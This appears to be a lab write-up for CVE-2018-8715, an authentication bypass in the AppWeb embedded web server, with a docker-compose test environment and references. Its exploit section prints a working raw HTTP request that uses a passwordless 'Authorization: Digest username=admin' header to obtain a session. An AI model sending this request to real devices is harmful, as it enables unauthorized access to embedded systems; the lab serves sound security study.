# AppWeb Authentication Bypass Vulnerability（CVE-2018-8715）

AppWeb is an embedded Web Server based on GPL open source protocol developed and maintained by Embedthis Software LLC. 

It is written in C / C ++ and can run on almost all popular operating systems. 

Of course, main application scenario is to provide a Web Application container for embedded devices.

AppWeb can be configured for authentication. The authentication methods include the following three methods:

- `basic` - Traditional HTTP basic authentication
- `digest` - Improved HTTP basic authentication. After successful authentication, cookies will be used to save the state without passing the Authorization header.
- `form` -  authentication

In versions prior to 7.0.3, both digest and form authentication methods, if the user passed in a null password (no password parameter was passed), appweb will directly authenticate successfully due to a logical error and return to session.

Reference links:

- https://ssd-disclosure.com/index.php/archives/3676
- https://github.com/embedthis/appweb/issues/610

##  Vulnerability environment

Run the following command to start an appweb server with digest authentication:

```
docker-compose up -d
```

Visit http://your-ip:8080 , you can see that you need to enter your account password.

##  Exploit

To exploit this vulnerability, you need to know an existing user name. In the current environment, the user name is `admin`.

Construct the header **Authorization: Digest username=admin** and send the following data packet:

```
GET / HTTP/1.1
Host: example.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Authorization: Digest username=admin
```

Because we didn't pass in the password field, the server had encountered an error, responded with `200`, and included a session:

![](1.png)

Set this session to the browser, and you can access the page that needs authentication normally:

![](2.png)
